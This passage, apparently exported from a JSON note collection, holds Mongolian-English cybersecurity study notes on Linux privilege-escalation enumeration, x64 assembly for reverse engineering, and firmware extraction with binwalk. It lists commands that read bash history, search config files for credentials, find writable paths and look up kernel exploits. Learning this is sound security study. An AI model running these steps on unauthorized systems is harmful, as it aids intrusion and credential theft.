2>/dev/null\n```\n\nЭнэ нь бүр сонирхолтой.\n\nRoot бол:\n\n```\n👑 MASTER KEY\n```\n\nCapabilities бол:\n\n```\n🔑 нэг жижиг special power\n```\n\nЖишээ mental model:\n\n```\nProgram\n   │\n   ├── normal powers\n   │\n   └── + one special capability\n```\n\nТэгэхээр:\n\n> **“Энэ программ бүх root биш ч root-ын аль нэг тусгай чадварыг авсан уу?”**\n\nгэдгийг шалгаж байна.\n\n---\n\n# 🧠 ACT 3 MEMORY\n\n```\nSUID\n ↓\n\"Owner-ийн badge байна уу?\"\n\nSGID\n ↓\n\"Group-ийн badge байна уу?\"\n\nCapabilities\n ↓\n\"Нууц special power байна уу?\"\n```\n\n---\n\n# 🎬 ACT 4 — “Хүмүүс хаа сайгүй нууц үлдээдэг”\n\nОдоо:\n\n```\n📄 config\n🧠 history\n🔑 credentials\n```\n\nхайна.\n\nЭнийг би:\n\n# 🕵️ “Хүний мартсан юмс”\n\nгэж нэрлэнэ.\n\n---\n\n## 📄 Config files\n\n```\n*.conf\n*.config\n```\n\nгэдэг нь программын **зааврын ном**.\n\nЖишээ mental picture:\n\n```\n📘 application.conf\n\ndatabase = ...\nusername = ...\npassword = ...\n```\n\nТиймээс config:\n\n> **“Программ өөрөө ямар нууцтай вэ?”**\n\nгэсэн асуултад хариулж болно.\n\n---\n\n# 🧠 Bash History = Хүний ой санамж\n\n```\ncat ~/.bash_history\n```\n\nгэдэг нь:\n\n> **“Энэ user өмнө нь terminal дээр юу хийж байсан бэ?”**\n\nгэдгийг хардаг.\n\nХүмүүс заримдаа command line дээр:\n\n```\nssh ...\nmysql ...\nexport ...\n```\n\nзэрэг sensitive мэдээллийг санамсаргүй үлдээж чадна.\n\nТиймээс:\n\n```\n🧠 history = хүний өнгөрсөн мөр\n```\n\n---\n\n# 🌐 `/var/www` = Website-ийн арын өрөө\n\nWebsite source code дотор configuration, connection information, application secrets зэрэг зүйл **байж болох**.\n\nТиймээс:\n\n```\n/var/www\n   ↓\nweb source\n   ↓\nconfig\n   ↓\npossible credentials\n```\n\nгэж харна.\n\n---\n\n# 🎬 ACT 5 — “Одоо энэ castle-д ЮУ амьдарч байна?”\n\nОдоо:\n\n```\nps aux\nps aux | grep root\n```\n\n---\n\n# 👀 `ps aux` = CCTV\n\nЭнэ бол:\n\n> **“Одоогоор ямар process ажиллаж байна?”**\n\nгэсэн асуулт.\n\n```\n⚙️ nginx\n⚙️ apache\n⚙️ mysql\n⚙️ python\n⚙️ backup\n...\n```\n\nгэх мэт.\n\n---\n\n# 👑 `ps aux | grep root`\n\nЭнэ бол:\n\n> **“Root яг юу хийж байна?”**\n\nгэсэн камер.\n\nЯагаад сонирхолтой вэ?\n\nУчир нь зарим privileged service эсвэл custom process системийн trust relationship дээр тулгуурладаг.\n\n---\n\n# 🚪 `ss -tulnp` / `netstat -tulnp`\n\nЭнийг:\n\n> **Castle-ийн нээлттэй хаалгууд**\n\nгэж төсөөл.\n\n```\n22    → 🚪\n80    → 🚪\n3306  → 🚪\n8080  → 🚪\n```\n\nгэх мэт.\n\nТэгээд асуулт:\n\n> **“Ямар service аль хаалганы цаана сонсож байна?”**\n\n---\n\n# 🎬 ACT 6 — “Хэзээ юу автоматаар ажилладаг вэ?”\n\nЭнд:\n\n# ⏰ CRON\n\nорж ирнэ.\n\nCron бол **шөнийн робот**.\n\n```\n⏰ 02:00\n   ↓\n🤖 backup runs\n```\n\nТэгэхээр:\n\n```\ncat /etc/crontab\ncrontab -l\nls -la /etc/cron.*\n```\n\nгэх мэтээр:\n\n> **“Ямар ажил хэзээ автоматаар ажилладаг вэ?”**\n\nгэж шалгана.\n\n---\n\n# 🧠 Cron-ийн жинхэнэ асуулт\n\nЗүгээр:\n\n> “Cron байна уу?”\n\nбиш.\n\nХарин:\n\n```\n🤖 WHAT?\n+\n⏰ WHEN?\n+\n👤 WHO?\n+\n✍️ CAN IT BE CHANGED?\n```\n\nгэдгийг бод.\n\nЖишээлбэл:\n\n```\n👑 root\n   ↓\n⏰ cron\n   ↓\n📄 script\n```\n\nгэсэн chain байвал:\n\n> **“Root автоматаар юуг ажиллуулдаг вэ?”**\n\nгэдэг асуулт маш чухал болно.\n\n---\n\n# 🎬 ACT 7 — “Би хаана 📝 бичиж чаддаг вэ?”\n\nЭнэ:\n\n```\nfind / -writable -type d 2>/dev/null\nfind / -writable -type f 2>/dev/null\n```\n\nгэсэн хэсэг.\n\nЭнийг:\n\n# ✍️ “Би юунд гар хүрч чадах вэ?”\n\nгэж сана.\n\nЧи ямар нэг файлд:\n\n```\n👀 READ\n```\n\nэрхтэй байж болно.\n\nГэхдээ:\n\n```\n✍️ WRITE\n```\n\nэрхтэй бол илүү их боломжтой.\n\nГэхдээ **writable = automatically vulnerable** биш.\n\nХамгийн чухал chain:\n\n```\n✍️ WRITE\n   +\n👑 PRIVILEGED PROCESS TRUSTS IT\n   +\n⚙️ IT GETS EXECUTED/LOADED\n```\n\nбайх үед асуудал болж болно.\n\n---\n\n# 🎬 ACT 8 — “Castle-ийн foundation хуучин уу?”\n\nСүүлд:\n\n```\nuname -a\ncat /proc/version\n```\n\nгээд kernel-ийн хувилбарыг шалгана.\n\nТэгээд:\n\n```\nsearchsploit ubuntu 16.04\n```\n\nгэх мэтээр public exploit мэдээлэл хайж болно.\n\nГэхдээ энд маш чухал:\n\n> **“Exploit олдлоо” ≠ “энэ машин дээр ажиллана.”**\n\nЧи version, architecture, configuration, patch level, шаардлагатай нөхцөл зэргийг тулгах хэрэгтэй.\n\n---\n\n# ☠️ Kernel = BIG HAMMER\n\nЯагаад хамгийн сүүлд?\n\nУчир нь:\n\n```\nSudo\nSUID\nCapabilities\nCron\nCredentials\nWritable files\n```\n\nгээд илүү энгийн зам байхад:\n\n```\n💣 KERNEL EXPLOIT\n```\n\nрүү шууд үсрэх шаардлагагүй.\n\nMental model:\n\n```\n🔑 жижиг түлхүүр олдож магадгүй\n        ↓\n🚪 эхлээд энгийн хаалгыг шалга\n        ↓\n💣 том hammer-ийг хамгийн сүүлд\n```\n\n---\n\n# 🧠 ОДОО БҮХ NOTES-ИЙГ НЭГ STORY БОЛГО\n\nЧи Linux machine дотор орлоо:\n\n```\n                 🏰 LINUX\n                    │\n                    ▼\n              👤 WHO AM I?\n                    │\n                    ▼\n          🔑 WHAT POWER DO I HAVE?\n                    │\n           ┌────────┼────────┐\n           ▼        ▼        ▼\n         SUDO     SUID      CAPS\n           │        │        │\n           └────────┼────────┘\n                    ▼\n             📄 WHAT EXISTS?\n                    │\n          ┌─────────┼─────────┐\n          ▼         ▼         ▼\n       CONFIG     HISTORY   CREDS\n          │\n          ▼\n           ⚙️ WHAT IS RUNNING?\n                    │\n                    ▼\n                🚪 PORTS\n                    │\n                    ▼\n             ⏰ WHAT RUNS\n                AUTOMATICALLY?\n                    │\n                    ▼\n                ✍️ WHAT\n              CAN I WRITE?\n                    │\n                    ▼\n             🧬 OLD KERNEL?\n                    │\n                    ▼\n                  👑\n                 ROOT\n```\n\n---\n\n# 🔥 Харин энэ note-ийн хамгийн чухал concept\n\nЧи **“8 exploit цээжлэх”** гэж бүү бод.\n\nЧи ердөө:\n\n> **“Privilege escalation гэдэг нь системээс аль хэдийн надад өгөгдсөн итгэлцэл, permission, automation, configuration-ийн хаана нь алдаа байгааг олох процесс.”**\n\nгэж ойлго.\n\nТэгээд 8 vector-ийг ингэж хар:\n\n|Vector|Толгойдоо харах зураг|\n|---|---|\n|👑 Sudo|“Root надад ямар түлхүүр өгсөн?”|\n|🧷 SUID|“Ямар program owner-ийн badge өмсдөг?”|\n|🧬 Capabilities|“Хэнд root-ийн жижиг power өгсөн?”|\n|⏰ Cron|“Root хэзээ юу автоматаар ажиллуулдаг?”|\n|📄 Files/creds|“Хүмүүс хаана нууцаа үлдээсэн?”|\n|🛣️ PATH|“Program яг аль command-ийг сонгох вэ?”|\n|🧪 .so|“Program ямар library-д итгэдэг вэ?”|\n|☠️ Kernel|“Системийн суурь өөрөө эмзэг үү?”|\n\n## 🧠 SUPER MEMORY HOOK\n\n> **👤 WHO → 🔑 POWER → 📄 SECRETS → ⚙️ RUNNING → ⏰ AUTOMATION → ✍️ WRITE → 🧬 KERNEL**",
    "sourcePath": "cheater/cheatshit 3.md"
  },
  {
    "id": 10006,
    "title": "cheatshit 4",
    "room": "cheater",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "cheater",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "7 min",
    "date": "KS import",
    "excerpt": "KS source: cheater/cheatshit 4.md",
    "content": "🧠 Cybersecurity Field Guide\n\n> **Purpose:** Turn a dense technical cheat sheet into a visual, memorable Obsidian note.\n> \n> ⚠️ **Use only on systems, networks, binaries, and labs you are explicitly authorized to test.**\n\n---\n\n# 🗺️ The Big Picture\n\nThink of the whole workflow as a game map:\n\n```\n🛰️ RECON\n   ↓\n🚪 SERVICES\n   ↓\n🔓 ACCESS\n   ↓\n⬆️ PRIV ESC\n   ↓\n🔬 REVERSE ENGINEERING\n   ↓\n📦 FIRMWARE\n```\n\n### 🧩 Memory Hook\n\n> **“See → Enter → Rise → Understand → Extract”**\n\n|Stage|Question to remember|\n|---|---|\n|🛰️ Recon|**What exists?**|\n|🚪 Services|**What is exposed?**|\n|🔓 Access|**Can the service be abused?**|\n|⬆️ Priv Esc|**How do I go higher?**|\n|🔬 RE|**What is the binary doing?**|\n|📦 Firmware|**What is hidden inside?**|\n# 🔬 SECTION 4 — REVERSE ENGINEERING & ASSEMBLY\n\n## 🎥 Эхлээд том зураг\n\nReverse engineering гэж:\n\n> **“Энэ binary-г ажиллуулахад CPU яг юу хийж байгааг араас нь мөрдөх.”**\n\nгэж ойлго.\n\nЖишээ нь:\n\n```\n📦 program\n\n     ↓\n\n🔬 Reverse Engineering\n\n     ↓\n\n🧠 CPU:\n\"Энэ instruction юу хийж байна?\"\n\"Data хаана байна?\"\n\"Яагаад энд үсэрч байна?\"\n\"Энэ function-д ямар argument өгсөн бэ?\"\n```\n\n---\n\n# 🧠 4.1 x64 CPU — CPU-г НЭГ ОФФИС гэж төсөөл\n\nCPU дотор маш хурдан ажилладаг жижиг storage-ууд байдаг.\n\nТэднийг:\n\n# 🗃️ REGISTER\n\nгэдэг.\n\nТэгэхээр register-ийг:\n\n> **CPU-ийн ширээн дээр байгаа маш жижиг, маш хурдан хайрцаг**\n\nгэж төсөөл.\n\n---\n\n# 📍 RIP — GPS\n\n`RIP` = **Instruction Pointer**\n\nҮүнийг хамгийн түрүүнд ойлго.\n\nCPU яг одоо:\n\n```\nProgram:\n100\n101\n102\n103\n104\n105\n...\n```\n\nгэсэн instruction-уудаар явж байна гэж бод.\n\nCPU:\n\n```\n\"Би одоо аль instruction дээр байна?\"\n```\n\nгэдгийг RIP-ээр мэднэ.\n\nТиймээс:\n\n```\nRIP = 103\n        ↓\nCPU дараагийн execution context-ээ\nэндээс үргэлжлүүлнэ\n```\n\n### 🧠 Mental image\n\n```\nProgram memory\n\n100   instruction\n101   instruction\n102   instruction\n103   👈 RIP\n104   instruction\n105   instruction\n```\n\nТиймээс RIP бол:\n\n> 🧭 **CPU-ийн GPS**\n\n---\n\n# 💥 Яагаад RIP security дээр чухал вэ?\n\nХэрэв control flow-д нөлөөлөх хэмжээний memory corruption гарч, RIP-ийг attacker-ийн хүссэн утгаар өөрчлөх нөхцөл бүрдвэл CPU дараагийн execution-ээ өөр газар чиглүүлж болно.\n\nMental image:\n\n```\nNormal:\n\nRIP\n ↓\nA → B → C → D\n\n\nCorrupted control flow:\n\nRIP\n ↓\nA → B → 💥 → attacker-controlled location\n```\n\nТиймээс buffer overflow ярьж байх үед:\n\n> **“RIP хаашаа явж байна?”**\n\nгэдэг маш чухал асуулт болдог.\n\n---\n\n# 🧮 RAX — “хариуны хайрцаг”\n\n`RAX`-ийг:\n\n> 🗃️ **Function-ийн answer box**\n\nгэж төсөөл.\n\nЖишээ нь function:\n\n```\nis_password_correct()\n```\n\nгэж байгаа.\n\nFunction ажиллаад:\n\n```\n1\n```\n\nбуцааж болно.\n\nТэр return value register-үүдийн calling convention-оос хамаараад `RAX`-тай холбогдоно.\n\nТиймээс mental model:\n\n```\nfunction()\n   ↓\ncomputes answer\n   ↓\nRAX = result\n```\n\nХарин note-ийн жишээн дээр:\n\n```\n1 = true\n0 = false\n```\n\nгэж ойлгож болно.\n\n### 🧠 Санах:\n\n> **RIP = “хаашаа?”**\n> \n> **RAX = “хариу нь юу?”**\n\n---\n\n# 🪆 REGISTER SLICING — Matryoshka Doll\n\nЭнэ хэсэг маш гоё.\n\n`RAX`-ийг нэг том **64-bit хайрцаг** гэж төсөөл.\n\nТүүний дотор:\n\n```\nRAX\n└── EAX\n    └── AX\n        └── AL\n```\n\nбайгаа юм шиг.\n\nГэхдээ нэг чухал ойлголт:\n\n> Эдгээр нь тус тусдаа “өөр register” биш; **RAX register-ийн өөр хэмжээтэй хэсгүүд/нэршлүүд**.\n\n---\n\n## 🪆 Зураг\n\n```\nRAX\n┌────────────────────────────────────┐\n│             64 bits                │\n│                                    │\n│   EAX = lower 32 bits              │\n│   ┌────────────────────────────┐   │\n│   │          32 bits           │   │\n│   │                            │   │\n│   │ AX = lower 16 bits         │   │\n│   │ ┌──────────────────────┐   │   │\n│   │ │       16 bits        │   │   │\n│   │ │                      │   │   │\n│   │ │ AL = lower 8 bits    │   │   │\n│   │ └──────────────────────┘   │   │\n│   └────────────────────────────┘   │\n└────────────────────────────────────┘\n```\n\nТиймээс:\n\n```\nRAX = 64\nEAX = 32\nAX  = 16\nAL  = 8\n```\n\n---\n\n# 🤯 Яагаад хэрэгтэй вэ?\n\nЖишээ:\n\n```\nRAX = 0x1122334455667788\n```\n\nХэрэв `EAX`-ийг харвал lower 32 bits:\n\n```\n0x55667788\n```\n\nХарин `AX`:\n\n```\n0x7788\n```\n\n`AL`:\n\n```\n0x88\n```\n\nболно.\n\nИймээс:\n\n> **“Нэг register-ийн тодорхой хэсгийг л ашиглах”**\n\nгэдгийг assembly дээр байнга харна.\n\n---\n\n# 📞 4.2 Calling Convention — “Function руу орох утасны дугаарууд”\n\nFunction дуудахад:\n\n```\ncalculate(a, b, c, d)\n```\n\nгэж 4 argument байгаа гэж бод.\n\nCPU:\n\n> “Эдгээр 4 зүйлийг хаана тавих вэ?”\n\nгэдэг дүрэм хэрэгтэй.\n\nТэр дүрэм нь:\n\n# 📞 Calling Convention\n\nЧиний note-ийн дагуу:\n\n```\n1st → RCX\n2nd → RDX\n3rd → R8\n4th → R9\n5th+ → Stack\n```\n\nТэгэхээр:\n\n```\nArgument #1\n   ↓\nRCX\n\nArgument #2\n   ↓\nRDX\n\nArgument #3\n   ↓\nR8\n\nArgument #4\n   ↓\nR9\n\nArgument #5+\n   ↓\nSTACK\n```\n\n### 🧠 Memory rhyme\n\n> **“C D 8 9, then Stack.”**\n\nҮүнийг яг ингэж хэлээд сурчих.\n\n---\n\n# ⚠️ Нэг чухал technical note\n\nЭнэ `RCX → RDX → R8 → R9` дараалал нь **Windows x64 calling convention / Microsoft x64**-ийн үндсэн argument register sequence-тэй холбоотой.\n\nХарин Linux x86-64 дээр ихэвчлэн:\n\n```\nRDI\nRSI\nRDX\nRCX\nR8\nR9\n```\n\nашигладаг.\n\nТиймээс чи reverse engineering хийхдээ:\n\n> **“x64 = заавал RCX, RDX, R8, R9”**\n\nгэж ерөнхийлж болохгүй.\n\n**Calling convention-оо эхлээд тань.**\n\n---\n\n# 🧱 4.3 Assembly — CPU-ийн үйл үгс\n\nAssembly code-ийг хүний хэлээр:\n\n> **CPU-д өгч буй маш жижиг үйлдлүүдийн жагсаалт**\n\nгэж төсөөл.\n\nЖишээ:\n\n```\nMOV\nLEA\nXOR\nCMP\nJCC\nNOP\n```\n\nЭдгээрийг зургаар ойлгоё.\n\n---\n\n# 📦 MOV = “ЗӨӨ”\n\n```\nMOV destination, source\n```\n\nMental image:\n\n```\n📦 SOURCE\n   │\n   │ MOV\n   ▼\n📥 DESTINATION\n```\n\nЖишээ:\n\n```\nmov rax, rbx\n```\n\nойролцоогоор:\n\n> “RBX-ийн утгыг RAX-д тавь.”\n\n---\n\n## 🧠 `[ ]` яагаад чухал вэ?\n\n```\nmov rax, rbx\n```\n\n= register-ийн утга.\n\nХарин:\n\n```\nmov rax, [rbx]\n```\n\nгэхэд `[rbx]` нь:\n\n> **“RBX-д байгаа хаяг руу очоод, тэнд байгаа memory value-г ав.”**\n\nгэсэн санаа.\n\nТэгэхээр:\n\n```\nrbx = address\n       ↓\n     [rbx]\n       ↓\n   memory there\n```\n\n### 🧠 Memory\n\n> **No brackets → value**\n> \n> **Brackets → memory at that address**\n\n---\n\n# 🧭 LEA = “Хаягийг тооцоол”\n\n`LEA`:\n\n```\nlea destination, [address]\n```\n\nҮүнийг:\n\n> **“Энд очихгүй. Зөвхөн хаягийг тооцоолоод өг.”**\n\nгэж төсөөл.\n\nЖишээ mental image:\n\n```\n🏠 1000\n├── room\n├── room\n└── room\n```\n\n`LEA`:\n\n> “Энэ room хаана байгааг надад тооцоод өг.”\n\nХарин memory-г шууд уншихгүй.\n\n### 🧠\n\n`MOV` + brackets → **очоод ав**\n\n`LEA` → **очих хаягийг тооц**\n\n---\n\n# 🧹 XOR = “өөртэйгөө XOR хийгээд цэвэрлэ”\n\n```\nxor rax, rax\n```\n\nӨөртэйгөө XOR хийвэл:\n\n```\nX XOR X = 0\n```\n\nТиймээс:\n\n```\nRAX = ??????\n        ↓\nxor rax, rax\n        ↓\nRAX = 0\n```\n\nMental image:\n\n🧹 **CPU register vacuum cleaner**\n\n---\n\n# ⚖️ CMP = “Шүүгч”\n\n```\ncmp A, B\n```\n\nCPU шууд:\n\n> “A ямар байна? B-ээс том уу? Тэнцүү юу?”\n\nгэж тусад нь boolean хадгалахгүй.\n\nЕрөнхийдөө subtract-тай төстэй байдлаар **flags**-ийг тохируулна.\n\nЖишээ:\n\n```\ncmp rax, 0\n```\n\nдараа нь:\n\n```\nje ...\n```\n\nбайвал:\n\n> **“Хэрэв тэнцүү бол үсэр.”**\n\n---\n\n# 🚦 JCC = “Замын уулзвар”\n\nCPU замаар явж байлаа:\n\n```\n──────────────►\n       │\n       ├──► road A\n       │\n       └──► road B\n```\n\n`JCC`:\n\n> **“Нөхцөлөөс хамаараад аль замаар явах вэ?”**\n\n---\n\n## Нэрийг нь ингэж төсөөл\n\n```\nJE / JZ\n↓\n\"Equal / Zero болсон уу?\"\n\nJNE / JNZ\n↓\n\"Equal биш / Zero биш үү?\"\n\nJG / JL\n↓\nSigned comparison\n\nJA / JB\n↓\nUnsigned comparison\n```\n\n---\n\n# 🧠 Маш чухал\n\n`CMP` болон `JCC` ихэвчлэн **хосоороо** ойлгогдоно.\n\n```\nCMP\n ↓\nflags\n ↓\nJCC\n ↓\ndecision\n```\n\nMental story:\n\n> ⚖️ `CMP` = шүүгч харьцуулна  \n> 🚦 `JCC` = үр дүнгээр нь аль замаар явахыг сонгоно\n\n---\n\n# 🧍 NOP = “ЮУ Ч БҮҮ ХИЙ”\n\n```\nNOP\n```\n\nCPU:\n\n> “Энд юу ч хийхгүй.”\n\n😂\n\n```\nInstruction\nInstruction\nNOP\nInstruction\n```\n\nNOP = **No Operation**.\n\n---\n\n# 🧠 NOP Sled гэж юу вэ?\n\nBuffer overflow-ийн historical exploit contexts-д:\n\n```\nNOP NOP NOP NOP NOP\n           ↓\n      target region\n```\n\nгэх мэт NOP-уудын дараалал ашиглаж, control-flow landing-ийг илүү forgiving болгох санаа байсан.\n\nMental image:\n\n> 🛝 **Хальтирдаг зам**\n\nНэг цэг дээр яг онох биш, өргөн NOP region дээр буугаад payload руу “гулсаж” очих санаа.\n\n---\n\n# 🧱 4.4 STACK — “Давхар овоолсон хайрцаг”\n\nStack-ийг:\n\n```\n📚📚📚📚\n```\n\nгэж төсөөл.\n\nFunction call хийх үед temporary data, saved state, local variables гэх мэт зүйлс stack-тэй холбоотой байрладаг.\n\nx86-64 дээр уламжлалт stack direction:\n\n```\nHIGH ADDRESS\n     │\n     │\n     ▼\n   STACK\n     │\n     ▼\nLOW ADDRESS\n```\n\nИймээс stack grows **downward**, өөрөөр хэлбэл lower addresses руу.\n\n---\n\n# ⬇️ PUSH = доош\n\n```\nPUSH\n ↓\nRSP decreases\n```\n\nMental image:\n\n```\n📦\n📦\n📦\n⬇️\n```\n\n---\n\n# ⬆️ POP = дээш\n\n```\nPOP\n ↓\nRSP increases\n```\n\nТиймээс:\n\n> **Push goes down. Pop comes up.**\n\nгэсэн memory trick чинь маш сайн.\n\n---\n\n# 🌍 Little-Endian — “бага byte түрүүлж явна”\n\nЭнэ хэсгийг ойлгоход **byte**-оор бод.\n\nЖишээ:\n\n```\n0x77AABBCC\n```\n\nЭнд byte-ууд:\n\n```\n77 AA BB CC\n```\n\nLittle-endian memory-д:\n\n```\nCC BB AA 77\n```\n\nгэж байрлана.\n\n---\n\n# 🍬 Яагаад?\n\n“Little endian” гэдгийг:\n\n> **“Number-ийн хамгийн бага significant byte-г эхэнд тавина.”**\n\nгэж сана.\n\n### 🧠 Жижиг зураг\n\n```\nNumber:\n\n77 AA BB CC\n\nMemory:\n\n[CC][BB][AA][77]\n ↑\n first\n```\n\nТиймээс:\n\n> **Little → little/least significant byte first**\n\nгэж сана.\n\n---\n\n# 🔬 4.5 Reverse Engineering Toolkit\n\nОдоо чи CPU-ийн хэлний үндсийг ойлголоо.\n\nТэгвэл:\n\n> **“Binary дотор яг юу болоод байгааг яаж харах вэ?”**\n\nгэдэг асуудал гарна.\n\n---\n\n# 🔍 `objdump` = Binary-г задлаад assembly болгоно\n\n```\nobjdump -M intel -d [BINARY]\n```\n\nMental image:\n\n```\n📦 Binary\n   ↓\n🔬 objdump\n   ↓\n🧾 Assembly\n```\n\nЧамд:\n\n```\nmov\ncmp\ncall\njmp\n...\n```\n\nгэх мэт instruction-ууд харагдана.\n\n---\n\n# 🔎 `grep -B 15` = “Өмнөх 15 алхмыг хар”\n\n```\ngrep -B 15 \"call.*<target_func>\" source.asm\n```\n\n`-B`:\n\n> **Before**\n\nТиймээс:\n\n```\ntarget_func\n    ↑\n15 lines before\n```\n\n---\n\n# 🔎 `grep -A 20` = “Дараах 20 алхмыг хар”\n\n`-A`:\n\n> **After**\n\n```\ngrep -A 20 \"target_func\" source.asm\n```\n\n---\n\n# 🕵️ `ltrace` = “Program хэнийг дуудсаныг чагнах”\n\n```\nltrace ./binary\n```\n\nҮүнийг:\n\n> 🎧 **Program-ийн phone calls-ыг сонсох**\n\nгэж төсөөл.\n\nЖишээ:\n\n```\nstrcmp(...)\nstrncmp(...)\nprintf(...)\n```\n\nгэх мэт library calls харагдаж болно.\n\n---\n\n# 🧾 `strings` = “Binary доторх хүний унших үгсийг шүүрд”\n\n```\nstrings -n 6 [BINARY]\n```\n\nBinary дотор:\n\n```\nEnter password:\nInvalid login\nWelcome\nadmin\nconfig\n...\n```\n\nгэх мэт ASCII strings байж болно.\n\n`strings` бол:\n\n> **“Binary дотор хүний уншиж болох ямар clue байна?”**\n\nгэж хурдан шалгах хэрэгсэл.\n\n---\n\n# 🧠 Одоо RE workflow-ийг movie болго\n\nЧиний note:\n\n> **Disassemble → Locate → Trace → Read strings**\n\nҮүнийг:\n\n```\n📦 BINARY\n   │\n   ▼\n🔬 DISASSEMBLE\n   │\n   ▼\n📍 LOCATE interesting function\n   │\n   ▼\n🎧 TRACE behavior\n   │\n   ▼\n🧾 READ strings / clues\n```\n\nгэж сана.\n\n---\n\n# 🔥 Хамгийн чухал MEMORY WALL\n\n## 🧠 REGISTERS\n\n```\nRIP → 🧭 WHERE CPU GOES\nRAX → 🧮 WHAT FUNCTION RETURNS\n```\n\n## 🪆 REGISTER SIZE\n\n```\nRAX → 64\nEAX → 32\nAX  → 16\nAL  → 8\n```\n\n> **Big doll → smaller doll**\n\n## 📞 ARGUMENTS\n\nЧиний source convention:\n\n```\nRCX → 1\nRDX → 2\nR8  → 3\nR9  → 4\nSTACK → 5+\n```\n\n> **C D 8 9 → Stack**\n\nГэхдээ **Linux x86-64 дээр өөр calling convention** байдгийг заавал санаж яв.\n\n---\n\n## 🧱 INSTRUCTIONS\n\n```\nMOV → 📦 COPY\nLEA → 🧭 ADDRESS\nXOR → 🧹 ZERO\nCMP → ⚖️ COMPARE\nJCC → 🚦 DECIDE\nNOP → 🧍 NOTHING\n```\n\n---\n\n## 🧠 MEMORY\n\n```\nSTACK\n↓\nlower addresses\n\nPUSH → ↓\nPOP  → ↑\n\nLittle-endian\n→ smallest-significant byte first\n```\n\n---\n\n# 🎯 Эцэст нь нэг жижиг CPU story\n\nCPU:\n\n```\n🧠 \"RIP хаана байна?\"\n        ↓\n       RIP\n        ↓\n\"Одоо энэ instruction-ийг ажиллуул.\"\n\n        ↓\n\n📦 MOV\n\"Data-г энд тавь.\"\n\n        ↓\n\n⚖️ CMP\n\"Энэ хоёр адил уу?\"\n\n        ↓\n\n🚦 JCC\n\"Тэгвэл аль замаар явах вэ?\"\n\n        ↓\n\n📞 CALL\n\"Function дуудая.\"\n\n        ↓\n\n🧮 RAX\n\"Function-ийн хариу энд байна.\"\n\n        ↓\n\n🧭 RIP\n\"Дараагийн instruction руу явъя.\"\n```\n\nИнгэж харвал assembly:\n\n> **“Хачин тэмдэгтүүдийн цуглуулга” биш.**\n\nХарин:\n\n> **CPU-ийн секунд тутам хийж байгаа маш жижиг шийдвэрүүдийн story**\n\nболно.\n\nТэгээд Reverse Engineering хийх үед хамгийн түрүүнд `RIP`, `RAX`, `RSP`, `RDI/RSI/...` зэрэг **“CPU яг юу мэдэж байгаа вэ?”** гэдгийг хараад, дараа нь `MOV → CMP → JCC → CALL` гэсэн урсгалыг мөрдөхөд binary аажмаар “ярих” шиг болж эхэлдэг.",
    "sourcePath": "cheater/cheatshit 4.md"
  },
  {
    "id": 10007,
    "title": "cheatshit 5",
    "room": "cheater",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "cheater",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "7 min",
    "date": "KS import",
    "excerpt": "KS source: cheater/cheatshit 5.md",
    "content": "🧠 Cybersecurity Field Guide\n\n> **Purpose:** Turn a dense technical cheat sheet into a visual, memorable Obsidian note.\n> \n> ⚠️ **Use only on systems, networks, binaries, and labs you are explicitly authorized to test.**\n\n---\n\n# 🗺️ The Big Picture\n\nThink of the whole workflow as a game map:\n\n```\n🛰️ RECON\n   ↓\n🚪 SERVICES\n   ↓\n🔓 ACCESS\n   ↓\n⬆️ PRIV ESC\n   ↓\n🔬 REVERSE ENGINEERING\n   ↓\n📦 FIRMWARE\n```\n\n### 🧩 Memory Hook\n\n> **“See → Enter → Rise → Understand → Extract”**\n\n|Stage|Question to remember|\n|---|---|\n|🛰️ Recon|**What exists?**|\n|🚪 Services|**What is exposed?**|\n|🔓 Access|**Can the service be abused?**|\n|⬆️ Priv Esc|**How do I go higher?**|\n|🔬 RE|**What is the binary doing?**|\n|📦 Firmware|**What is hidden inside?**|\n# 📦# 📦 SECTION 5 — FIRMWARE & EMBEDDED REVERSE ENGINEERING\n\nЭнэ хэсгийг хамгийн түрүүнд ингэж төсөөл:\n\n> 🧠 **Firmware = төхөөрөмжийн “тархи + filesystem + configuration + application” бүгдийг нэг image дотор савласан багц.**\n\nЖишээ нь:\n\n```\n📡 Router firmware\n      │\n      ▼\n┌─────────────────────────────┐\n│      FIRMWARE IMAGE         │\n│                             │\n│  🧠 Kernel                  │\n│  📁 Root filesystem         │\n│  🌐 Web interface           │\n│  ⚙️ Config                  │\n│  🔑 Credentials             │\n│  📦 Libraries               │\n│  ⚡ Startup scripts         │\n└─────────────────────────────┘\n```\n\nТиймээс firmware RE-ийн гол асуулт:\n\n> **“Энэ төхөөрөмж асаад ажиллахын тулд яг юу авч явж байна?”**\n\n---\n\n# 🎬 5.1 — `binwalk` = 🗺️ “Firmware-ийн рентген зураг”\n\nFirmware файлыг чи:\n\n```\n📦 router.bin\n```\n\nгэж харахад нэг том файл шиг.\n\nГэхдээ дотор нь:\n\n```\n[HEADER]\n[KERNEL]\n[COMPRESSED FS]\n[CONFIG]\n[WEB FILES]\n[OTHER DATA]\n```\n\nгэх мэт олон давхарга байж болно.\n\nТиймээс:\n\n```\nbinwalk firmware.img\n```\n\nгэдгийг:\n\n> 🔦 **“Энэ нэг том file дотор ямар ямар зүйл нуугдаж байна?”**\n\nгэж ойлго.\n\n---\n\n# 🔍 Magic bytes гэж юу вэ?\n\nКомпьютер зарим file type-ийг extension-ээр биш, **эхний/онцгой byte pattern**-аар таньдаг.\n\nЖишээ mental image:\n\n```\n📦 firmware.img\n\n0000  ?????\n0010  ????\n...\n```\n\nBinwalk:\n\n```\n👀 \"Аан!\nЭнд compressed archive байна.\nЭнд filesystem signature байна.\nЭнд kernel-тэй төстэй data байна.\"\n```\n\nТэгэхээр:\n\n> **Magic bytes = file-ийн “хурууны хээ”.**\n\n### 🧠 Memory hook\n\n**binwalk = “Нэрийг нь биш, хурууны хээг нь хай.”**\n\n---\n\n# 📦 `binwalk -e` = “Рентгенээс цаашлаад задал”\n\n```\nbinwalk -e firmware.img\n```\n\nЭнэ:\n\n```\n📦 Firmware\n    ↓\n🔎 Detect layers\n    ↓\n✂️ Extract recognized content\n    ↓\n📁 Files / filesystem / components\n```\n\nгэдэг санаа.\n\nТэгээд:\n\n```\nfirmware.img\n   ↓\n_extracted/\n   ├── kernel\n   ├── filesystem\n   ├── ...\n```\n\nгэх мэт бүтэц гарч ирж болно.\n\n### 🧠 Difference\n\n```\nbinwalk\n   ↓\n👀 \"Юу байна?\"\n\nbinwalk -e\n   